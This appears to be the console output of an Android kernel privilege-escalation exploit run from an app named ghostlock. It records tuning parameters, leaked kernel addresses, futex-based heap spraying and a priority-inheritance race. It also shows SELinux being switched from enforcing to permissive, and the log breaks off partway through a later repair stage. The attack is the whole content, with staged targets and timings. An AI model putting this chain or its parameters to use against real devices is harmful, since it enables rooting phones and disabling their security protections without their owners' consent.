[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=1
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=13095 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=59079 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=13095 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=13095 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=13095 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+53ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +223ms
[33m[*] [0m[spray] finding futex collisions... +453ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1984ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8907b8d000 +2010ms
[33m[*] [0m[spray] payload ready +2013ms
[31m[-] [0mpage ffffff8907b88000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 1/4 +2182ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +235ms
[33m[*] [0m[spray] finding futex collisions... +510ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2228ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff89b018d800 +2290ms
[33m[*] [0m[spray] payload ready +2296ms
[31m[-] [0mpage ffffff89b0188000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 2/4 +4645ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +249ms
[33m[*] [0m[spray] finding futex collisions... +506ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2103ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8a412e8c00 +2190ms
[33m[*] [0m[spray] payload ready +2193ms
[31m[-] [0mpage ffffff8a412e8000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 3/4 +7014ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +243ms
[33m[*] [0m[spray] finding futex collisions... +505ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2229ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8907c37000 +2248ms
[33m[*] [0m[spray] payload ready +2250ms
[33m[*] [0mprepare_kernel_page ok attempt=4 +9445ms
[33m[*] [0m[T+9500ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+11513ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff8907c30108 mode=1 leaf=1
[33m[*] [0m[T+11617ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +258ms
[33m[*] [0m[spray] finding futex collisions... +574ms
[33m[*] [0m[spray] early collision screen 10/7 at 31%
[33m[*] [0m[spray] futex collisions found +2227ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff89aad39800 +2286ms
[33m[*] [0m[spray] payload ready +2290ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2467ms
[33m[*] [0m[T+14090ms]   heap spray done
